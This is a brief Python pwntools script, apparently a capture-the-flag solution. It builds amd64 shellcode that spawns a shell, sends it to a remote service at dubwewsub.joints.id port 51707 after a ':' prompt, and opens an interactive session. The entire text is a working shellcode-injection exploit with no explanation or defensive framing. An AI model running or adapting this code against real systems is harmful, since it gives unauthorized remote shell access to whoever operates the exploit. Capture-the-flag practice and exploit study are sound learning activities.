from pwn import *
context.arch = 'amd64'
sh = asm(shellcraft.sh())
r = remote('dubwewsub.joints.id', 51707)
r.sendlineafter(':', sh)
r.interactive()